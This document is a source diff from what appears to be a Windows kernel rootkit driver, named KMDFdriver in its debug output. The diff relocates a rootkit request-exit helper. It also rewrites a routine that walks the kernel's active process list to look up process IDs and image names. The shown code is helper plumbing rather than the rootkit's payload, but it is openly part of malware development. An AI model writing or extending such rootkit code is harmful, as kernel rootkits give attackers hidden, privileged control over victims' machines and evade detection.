@@ -3,20 +3,6 @@
 #pragma warning(disable:4302)
 
 
-NTSTATUS general_helpers::ExitRootkitRequestADD(PEPROCESS From, PEPROCESS To, ROOTKIT_STATUS StatusCode, NTSTATUS Status, ROOTKIT_MEMORY* RootkInst) {
-	if (From != NULL) {
-		ObDereferenceObject(From);
-	}
-
-	if (To != NULL) {
-		ObDereferenceObject(To);
-	}
-	RootkInst->StatusCode = StatusCode;
-	RootkInst->Status = Status;
-	return Status;
-}
-
-
 NTSTATUS general_helpers::OpenProcessHandleADD(HANDLE* Process, ULONG64 PID) {
 	OBJECT_ATTRIBUTES ProcessAttr = { 0 };
 	CLIENT_ID ProcessCid = { 0 };
@@ -167,22 +153,24 @@ NTSTATUS general_helpers::GetPidNameFromListADD(ULONG64* ProcessId, char Process
 	LIST_ENTRY* CurrentList = NULL;
 	LIST_ENTRY* PreviousList = NULL;
 	LIST_ENTRY* NextList = NULL;
-	PreviousList = (LIST_ENTRY*)((ULONG64)PsInitialSystemProcess + EPOF_ActiveProcessLinks);
+	PACTEPROCESS CurrentProcess = (PACTEPROCESS)PsInitialSystemProcess;
+	PreviousList = &CurrentProcess->ActiveProcessLinks;
 	CurrentList = PreviousList->Flink;
+	CurrentProcess = (PACTEPROCESS)((ULONG64)CurrentList - ((ULONG64)&CurrentProcess->ActiveProcessLinks - (ULONG64)CurrentProcess));
 	NextList = CurrentList->Flink;
 
 	while (CurrentList != NULL) {
 		if (!NameGiven) {
-			if (*((ULONG64*)((ULONG64)CurrentList - EPOF_ActiveProcessLinks + EPOF_UniqueProcessId)) == *ProcessId) {
-				RtlCopyMemory(ProcessName, (char*)((ULONG64)CurrentList - EPOF_ActiveProcessLinks + EPOF_ImageFileName), 15);
+			if ((ULONG64)CurrentProcess->UniqueProcessId == *ProcessId) {
+				RtlCopyMemory(ProcessName, &CurrentProcess->ImageFileName, 15);
 				DbgPrintEx(0, 0, "KMDFdriver GetPidNameFromListADD - Found name %s for PID %llu\n", ProcessName, *ProcessId);
 				return STATUS_SUCCESS;
 			}
 		}
 		else {
-			RtlCopyMemory(CurrentProcName, (char*)((ULONG64)CurrentList - EPOF_ActiveProcessLinks + EPOF_ImageFileName), 15);
+			RtlCopyMemory(CurrentProcName, &CurrentProcess->ImageFileName, 15);
 			if (_stricmp(CurrentProcName, ProcessName) == 0) {
-				*ProcessId = *((ULONG64*)((ULONG64)CurrentList - EPOF_ActiveProcessLinks + EPOF_UniqueProcessId));
+				*ProcessId = (ULONG64)CurrentProcess->UniqueProcessId;
 				DbgPrintEx(0, 0, "KMDFdriver GetPidNameFromListADD - Found PID %llu for name %s\n", *ProcessId, ProcessName);
 				return STATUS_SUCCESS;
 			}
@@ -192,6 +180,7 @@ NTSTATUS general_helpers::GetPidNameFromListADD(ULONG64* ProcessId, char Process
 		CurrentList = NextList;
 		if (CurrentList != NULL) {
 			NextList = CurrentList->Flink;
+			CurrentProcess = (PACTEPROCESS)((ULONG64)CurrentList - ((ULONG64)&CurrentProcess->ActiveProcessLinks - (ULONG64)CurrentProcess));
 		}
 	}
 	return STATUS_NOT_FOUND;
@@ -567,4 +556,20 @@ SIZE_T requests_helpers::GetExpectedInfoSizeADD(SYSTEM_INFORMATION_CLASS InfoTyp
 	case SystemLookasideInformation: return 0;
 	default: return 0;
 	}
+}
+
+
+
+
+NTSTATUS requests_helpers::ExitRootkitRequestADD(PEPROCESS From, PEPROCESS To, ROOTKIT_STATUS StatusCode, NTSTATUS Status, ROOTKIT_MEMORY* RootkInst) {
+	if (From != NULL) {
+		ObDereferenceObject(From);
+	}
+
+	if (To != NULL) {
+		ObDereferenceObject(To);
+	}
+	RootkInst->StatusCode = StatusCode;
+	RootkInst->Status = Status;
+	return Status;
 }
